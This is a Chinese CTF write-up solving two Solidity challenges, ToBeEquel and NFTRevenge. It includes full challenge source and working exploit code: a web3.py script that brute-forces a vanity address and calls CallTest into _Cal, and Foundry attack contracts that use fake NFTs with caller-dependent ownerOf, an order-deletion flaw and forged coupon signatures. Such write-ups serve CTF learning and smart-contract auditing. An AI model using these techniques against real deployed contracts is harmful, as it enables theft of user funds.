# ToBeEquel

本题逻辑比较简单，考点主要是ABI编码和特殊地址的生成。
## 题目源码
```solidity
contract ToBeEquel {
    
    address private owner;
    mapping(address => uint) public balances;
    uint private last_balance;
    event ForFlag(address addr);
    
    constructor() public {
        owner = msg.sender;
        balances[owner] = 500;
    }
    
    modifier onlyOwner {
        require(msg.sender == owner || msg.sender == address(this), "not authorized");
        _;
    }
    
    function CallTest(address to, string memory customFallback, bytes memory data) public {
        if (_isContract(to)) {
            (bool success,) = to.call{value: 0}(
                abi.encodeWithSignature(customFallback, msg.sender, data)
            );
            assert(success);
        }
    }
    
    function _isContract(address addr) internal view returns (bool) {
        uint length;
        assembly {
            length := extcodesize(addr)
        }
        return (length > 0);
    }
    
    function _Cal(uint value, uint amount) public onlyOwner {
        require(balances[tx.origin]<balances[owner]);
        require(balances[tx.origin]>=last_balance);
        balances[owner] -= uint(value & 0xff);
        balances[tx.origin] += amount;
        last_balance = balances[tx.origin];
    }
    
    function getFlag() external {
        require(balances[owner]==balances[msg.sender]);
        emit ForFlag(msg.sender);
    }
    
}
```

## 题目分析

题目中首先给`owner`地址余额500，拿到flag的要求需要使余额和`owner`一样

其中`_Cal`函数可以减少owner余额，并且增加自己的余额。但题目中除了`CallTest`函数之外都有`onlyOwner`修饰符。而`CallTest`函数的作用是可以对传入的**合约地址任意执行**

进一步我们发现可以通过`CallTest`调用 `_Cal` 来bypass `onlyOwner`的要求。我们传入的`data`的内存结构为
```markdown
feb6d173                -> signature
address(msg.sender)     -> caller address
0x40                    -> offset of data
0x20                    -> length of data
data                    -> data
```
所以我们会发现每次调用`_Cal`函数时，自己余额增加永远都是64(0x40)，这里对ABI编码不熟悉的话自己实验一下也会发现，无论传入值是多少，增加的总是64

同时根据函数逻辑，`owner`减少的值为地址的后两位。所以我们对于地址的选择也是有讲究的。

由于$500-64=436>255$显然一次操作不能满足要求，所以$(500-128)/2=186$，我们需要找到地址末位为186(0xba)的地址。

## 攻击过程
```python
from web3 import Web3, HTTPProvider

w3 = Web3(HTTPProvider('http://140.210.217.225:8545'))

assert w3.isConnected()

while True:
    ac = w3.eth.account.create()
    if int(ac.address, 16) & 0xff == 186:
        break
print(ac.address)
print(ac.privateKey.hex())
```
接下来使用这个账号进行攻击等操作即可。
```python
from web3 import Web3, HTTPProvider
from Crypto.Util.number import bytes_to_long

rpc_url = 'http://140.210.195.172:8545'

w3 = Web3(HTTPProvider(rpc_url))
private_key = '0xc94ffbd4bdfb143c9e2b4092f0b36024b21d23d09af4317ce67ef72b338f092d'
account = w3.eth.account.privateKeyToAccount(private_key)
vul_addr = ''
vul_abi = ''
vul_contarct = w3.eth.contract(address=vul_addr, abi=vul_abi)

for _ in range(2):
    TransactionData = vul_contarct.functions['CallTest'](vul_addr,"_Cal(uint256,uint256)","0x00000000000000000000000000000000000000000000000000000000000000aa").buildTransaction({
        'chainId': w3.eth.chain_id,
        'from': account.address,
        'gas': 3000000,
        'gasPrice': w3.toWei(1,'wei'),
        'nonce': w3.eth.getTransactionCount(account.address),
        'value': w3.toWei(0,'wei')
    })
    signed_txn = w3.eth.account.signTransaction(TransactionData, private_key)
    txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
    txrecipet = w3.eth.waitForTransactionReceipt(txn_hash)
    print(txrecipet)
TransactionData = vul_contarct.functions['getFlag']().buildTransaction({
    'chainId': w3.eth.chain_id,
    'from': account.address,
    'gas': 3000000,
    'gasPrice': w3.toWei(1,'wei'),
    'nonce': w3.eth.getTransactionCount(account.address),
    'value': w3.toWei(0,'wei')
})
signed_txn = w3.eth.account.signTransaction(TransactionData, private_key)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txrecipet = w3.eth.waitForTransactionReceipt(txn_hash)
print(txrecipet)
```
## 总结

这里在攻击时没有仔细看服务端的脚本，导致request flag时一直输入的是旧的token，导致一直报错，最后发现是这个问题，所以这里要注意细心细心再细心。


# NFTRevenge

本题作为0ctf中NFT market的延续，使用了solidity编译器0.8.16，并且做出了一点小小的改动。

## 题目源码

```solidity
pragma solidity 0.8.16;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract CtfNFT is ERC721, Ownable {
    constructor() ERC721("CtfNFT", "NFT") {
        _setApprovalForAll(address(this), msg.sender, true);
    }

    function mint(address to, uint256 tokenId) external onlyOwner {
        _mint(to, tokenId);
    }
}

contract CtfToken is ERC20 {
    bool airdropped;

    constructor() ERC20("CtfToken", "CTK") {
        _mint(address(this), 100000000000);
        _mint(msg.sender, 1337);
    }

    function airdrop() external {
        require(!airdropped, "Already airdropped");
        airdropped = true;
        _mint(msg.sender, 5);
    }
}

struct Order {
    address nftAddress;
    uint256 tokenId;
    uint256 price;
}
struct Coupon {
    uint256 orderId;
    uint256 newprice;
    address issuer;
    address user;
    bytes reason;
}
struct Signature {
    uint8 v;
    bytes32[2] rs;
}
struct SignedCoupon {
    Coupon coupon;
    Signature signature;
}

contract CtfMarket {
    event SendFlag();
    event NFTListed(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    event NFTCanceled(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId
    );

    event NFTBought(
        address indexed buyer,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    bool tested;
    CtfNFT public ctfNFT;
    CtfToken public ctfToken;
    CouponVerifierBeta public verifier;
    Order[] orders;

    constructor() {
        ctfToken = new CtfToken();
        ctfToken.approve(address(this), type(uint256).max);

        ctfNFT = new CtfNFT();
        ctfNFT.mint(address(ctfNFT), 1);
        ctfNFT.mint(address(this), 2);
        ctfNFT.mint(address(this), 3);

        verifier = new CouponVerifierBeta();

        orders.push(Order(address(ctfNFT), 1, 1));
        orders.push(Order(address(ctfNFT), 2, 1337));
        orders.push(Order(address(ctfNFT), 3, 13333333337));
    }

    function getOrder(uint256 orderId) public view returns (Order memory order) {
        require(orderId < orders.length, "Invalid orderId");
        order = orders[orderId];
    }

    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {
        require(price > 0, "Invalid price");
        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");
        orders.push(Order(nftAddress, tokenId, price));
        emit NFTListed(msg.sender, nftAddress, tokenId, price);
        return orders.length - 1;
    }

    function cancelOrder(uint256 orderId) external {
        Order memory order = getOrder(orderId);
        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), "Not owner");
        _deleteOrder(orderId);
        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);
    }

    function purchaseOrder(uint256 orderId) external {
        Order memory order = getOrder(orderId);
        _deleteOrder(orderId);
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        ctfToken.transferFrom(msg.sender, owner, order.price);
        nft.safeTransferFrom(owner, msg.sender, order.tokenId);
        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);
    }

    function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
        Coupon memory coupon = scoupon.coupon;
        require(coupon.user == msg.sender, "Invalid user");
        require(coupon.newprice > 0, "Invalid price");
        verifier.verifyCoupon(scoupon);
        Order memory order = getOrder(coupon.orderId);
        uint price = order.price;
        _deleteOrder(coupon.orderId);
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        ctfToken.transferFrom(coupon.user, owner, price);
        IERC721(getOrder(coupon.orderId).nftAddress).safeTransferFrom(owner, coupon.user, order.tokenId);
        _deleteOrder(coupon.orderId);
        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);
    }

    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {
        require(!tested, "Tested");
        tested = true;
        IERC721 nft = IERC721(nftAddress);
        uint256 orderId = CtfMarket(this).createOrder(nftAddress, tokenId, price);
        nft.approve(address(this), tokenId);
        CtfMarket(this).purchaseOrder(orderId);
    }

    function win() external {
        require(ctfNFT.ownerOf(1) == msg.sender && ctfNFT.ownerOf(2) == msg.sender && ctfNFT.ownerOf(3) == msg.sender);
        emit SendFlag();
    }

    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {
        IERC721 nft = IERC721(nftAddress);
        address owner = nft.ownerOf(tokenId);
        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);
    }

    function _deleteOrder(uint256 orderId) internal {
        orders[orderId] = orders[orders.length - 1];
        orders.pop();
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract CouponVerifierBeta {
    CtfMarket market;
    bool tested;

    constructor() {
        market = CtfMarket(msg.sender);
    }

    function verifyCoupon(SignedCoupon calldata scoupon) public {
        require(!tested, "Tested");
        tested = true;
        Coupon memory coupon = scoupon.coupon;
        Signature memory sig = scoupon.signature;
        Order memory order = market.getOrder(coupon.orderId);
        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        require(coupon.issuer == owner, "Invalid issuer");
        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");
    }
}
```

## 题目分析

拿到flag的要求是将三个NFT都转移到自己的账户下，然后调用win函数。三个NFT分别价格为1，1337，13333333337。market合约拥有1337个token，而我们只能通过Airdrop获取5个token。所以我们需要采用一些手段。

## 解题思路

首先1号NFT价格为1，我们可以直接买。但是要注意买的顺序，这里在后面会提到。

再看2号NFT。注意到，market合约中有一个`purchaseTest`函数，只能调用一次，作用是让market合约去创建一个订单并且购买一个NFT。这里我们注意到，合约**没有对NFT的地址进行校验**。所以我们可以部署一个**假的NFT合约**，mint一个NFT给攻击合约并标价1337，让market去购买即可。这样我们的攻击合约就得到了1342个token，可以购买1、2NFT。

最后看3号NFT。这里题目合约实现了一个优惠券购买的功能，由**NFT的拥有者用私钥签名**，可以以任意价格购买NFT。但是这里的问题是显然3号NFT拥有者是market合约，不可能得到签名来的优惠券。

仔细观察`purchaseWithCoupon`函数。

```solidity
function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
    Coupon memory coupon = scoupon.coupon;
    require(coupon.user == msg.sender, "Invalid user");
    require(coupon.newprice > 0, "Invalid price");
    verifier.verifyCoupon(scoupon);
    Order memory order = getOrder(coupon.orderId);
    uint price = order.price;
    _deleteOrder(coupon.orderId);
    IERC721 nft = IERC721(order.nftAddress);
    address owner = nft.ownerOf(order.tokenId);
    ctfToken.transferFrom(coupon.user, owner, price);
    IERC721(getOrder(coupon.orderId).nftAddress).safeTransferFrom(owner, coupon.user, order.tokenId);
    _deleteOrder(coupon.orderId);
    emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);
}
```

发现了三个问题点：
- 函数中进行了**两次_deletOrder**，可能会导致订单秩序混乱
- owner由NFT合约提供，同样这里并没有对NFT的地址进行校验。
- 转账NFT的时候再次调用了`getOrder`函数，可能会发生错误转账。

再看_deleteOrder函数。

```solidity
function _deleteOrder(uint256 orderId) internal {
    orders[orderId] = orders[orders.length - 1];
    orders.pop();
}
```

每次将队尾元素放在要删除的位置，然后pop掉队尾元素。优点是不需要整体移动队列，节省了gas，缺点是会**导致队列顺序混乱**。

根据`purchaseWithCoupon`函数中的逻辑，如果我们在购买3号NFT的订单后添加一个订单，tokenId也为3，并且购买0号订单，那么在`_deleteOrder`函数生效后，0号订单会被1号订单覆盖，而1号订单被错误地执行并且将NFT转移到我们的账户下，过程大致如下。

```
| 1 | 2 | 3 | ----> | 1 | 2 | 3 | fake3 | ----> | fake3 | 2 | 3 | ----> | fake3 | 3 | ----> 3 
```

然而，这里我们遇到了一个问题，在`verifyCoupon`的过程中调用了NFT的`ownerOf`，并且要求拥有者是优惠券的签发者。但同样在`safeTransferFrom`过程中要求owner是market市场，才可以完成对3号NFT的转移。

所以问题在我们的NFT合约中，**如何在不改变状态变量的情况下，让同样的调用返回不同的结果？**

这里刚开始我的想法是利用`gasleft`来判断，我在本地进行了多次调试也成功了，但是远程始终打不通，所以在比赛中本题没有解出来。

后来在比赛结束后，我发现因为两次调用`ownerOf`的合约不同，故可以使用msg.sender来判断并且进行“看人下菜”。

可惜在比赛中短路了一时没想出来。

```solidity
function ownerOf(uint256 tokenId) public view returns (address) {
    if(msg.sender != address(market)){
        address owner = _ownerOf(tokenId);
        return owner;
    }
    return address(market);
}
```

## 攻击合约

```solidity
pragma solidity 0.8.16;

import "../src/vul.sol";
import "forge-std/Test.sol";

contract ENFT2 {
    CtfMarket market;
    address playerAddress;

    mapping(uint256 => address) private _owners;

    mapping(address => uint256) private _balances;

    mapping(uint256 => address) private _tokenApprovals;

    mapping(address => mapping(address => bool)) private _operatorApprovals;

    constructor(address marketAddress) {
        _setApprovalForAll(address(this), msg.sender, true);
        market = CtfMarket(marketAddress);
        playerAddress = msg.sender;
    }

    function _mint(address to, uint256 tokenId) internal virtual {
        unchecked {
            _balances[to] += 1;
        }

        _owners[tokenId] = to;
    }

    function _transfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {
        delete _tokenApprovals[tokenId];

        unchecked {
            _balances[from] -= 1;
            _balances[to] += 1;
        }
        _owners[tokenId] = to;
    }

    function _approve(address to, uint256 tokenId) internal virtual {
        _tokenApprovals[tokenId] = to;
    }

    function _setApprovalForAll(
        address owner,
        address operator,
        bool approved
    ) internal virtual {
        require(owner != operator, "ERC721: approve to caller");
        _operatorApprovals[owner][operator] = approved;
    }

    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public {
        _transfer(from, to, tokenId);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public {
        _safeTransfer(from, to, tokenId);
    }

    function _safeTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {
        _transfer(from, to, tokenId);
    }

    function approve(address to, uint256 tokenId) public virtual {
        _approve(to, tokenId);
    }

    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {
        return _owners[tokenId];
    }

    function ownerOf(uint256 tokenId) public view returns (address) {
        address owner = _ownerOf(tokenId);
        require(owner != address(0), "ERC721: invalid token ID");
        return owner;
    }

    function getApproved(uint256 tokenId)
        public
        view
        virtual
        returns (address)
    {
        return _tokenApprovals[tokenId];
    }

    function isApprovedForAll(address owner, address operator)
        public
        view
        virtual
        returns (bool)
    {
        return true;
    }
}

contract ENFT3 {
    mapping(uint256 => address) private _owners;

    mapping(address => uint256) private _balances;

    mapping(uint256 => address) private _tokenApprovals;

    mapping(address => mapping(address => bool)) private _operatorApprovals;

    CtfMarket market;
    CtfToken token;

    constructor(address _addr) {
        market = CtfMarket(_addr);
        token = market.ctfToken();
        _setApprovalForAll(address(this), _addr, true);
    }

    function _mint(address to, uint256 tokenId) internal virtual {
        unchecked {
            _balances[to] += 1;
        }

        _owners[tokenId] = to;
    }

    function _transfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {
        delete _tokenApprovals[tokenId];

        unchecked {
            _balances[from] -= 1;
            _balances[to] += 1;
        }
        _owners[tokenId] = to;
    }

    function _approve(address to, uint256 tokenId) internal virtual {
        _tokenApprovals[tokenId] = to;
    }

    function _setApprovalForAll(
        address owner,
        address operator,
        bool approved
    ) internal virtual {
        require(owner != operator, "ERC721: approve to caller");
        _operatorApprovals[owner][operator] = approved;
    }

    function getApproved(uint256 tokenId)
        public
        view
        virtual
        returns (address)
    {
        return _tokenApprovals[tokenId];
    }

    function isApprovedForAll(address owner, address operator)
        public
        view
        virtual
        returns (bool)
    {
        return true;
    }

    function approve(address to, uint256 tokenId) public virtual {
        _approve(to, tokenId);
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public virtual {
        _transfer(from, to, tokenId);
    }

    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }

    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {
        return _owners[tokenId];
    }

    function ownerOf(uint256 tokenId) public view returns (address) {
        if (msg.sender != address(market)) {
            address owner = _ownerOf(tokenId);
            return owner;
        }
        return address(market);
    }
}

contract exploit is Test {
    CtfMarket market = new CtfMarket();
    CtfToken token;
    CtfNFT nft;
    address attacker;

    constructor() {
        token = market.ctfToken();
        nft = market.ctfNFT();
        attacker = msg.sender;
    }

    function testattack() public {
        token.airdrop();
        token.approve(address(market), type(uint256).max);

        ENFT3 enft3 = new ENFT3(address(market));
        enft3.mint(attacker, 3);
        enft3.approve(address(market), 3);
        market.createOrder(address(enft3), 3, 1);

        ENFT2 enft2 = new ENFT2(address(market));
        enft2.mint(address(this), 0);
        enft2.approve(address(market), 0);
        market.purchaseTest(address(enft2), 0, 1337);
        market.purchaseOrder(0);
        market.purchaseOrder(1);
        SignedCoupon memory scoupon = sign(address(enft3));
        market.purchaseWithCoupon(scoupon);
        market.win();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function sign(address enftAddress) public returns (SignedCoupon memory) {
        uint256 playerPrivateKey = 0xb8305f5a0cacc7ade7f3aaa8702372307bdaaeb00e9447c85332284deec1477e;
        Coupon memory coupon = Coupon(
            0,
            1,
            address(0xe14924eC3FA63F8FD6f0937c3Fbcf86242dce2De),
            address(this),
            ""
        );
        Order memory order = Order(address(enftAddress), 3, 1);
        bytes memory serialized = abi.encode(
            "I, the issuer",
            coupon.issuer,
            "offer a special discount for",
            coupon.user,
            "to buy",
            order,
            "at",
            coupon.newprice,
            "because",
            coupon.reason
        );
        bytes32 digest = keccak256(serialized);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        bytes32[2] memory rs;
        rs[0] = r;
        rs[1] = s;
        Signature memory signature = Signature(v, rs);
        SignedCoupon memory scoupon = SignedCoupon(coupon, signature);
        return scoupon;
    }
}

```

首先，我们创建了两个NFT合约。刚开始的时候我是直接使用openzeppelin的库函数，后来发现合约大小超过了24KB于是只能一点点复制了。

其次，这里使用fonudry的vm功能对消息进行签名，但是在真实环境中没有这个功能，所以我们可以选择使用foundry在本地签名，将`(v, r, s)`作为参数传入。

![](../img/nitai.png)

## 总结
本题看起来非常长，逻辑难以理解，实际在读懂合约代码后，可以很清晰地将问题分为三个部分逐个击破。在合约逻辑中，**未经检查的传入地址会给合约带来很大的风险**，这一点在real world的hack事件中也是非常常见的。

这题没在比赛过程中做出来还是非常可惜的，还是思维不够灵活，希望以后可以多做题多积累积累经验。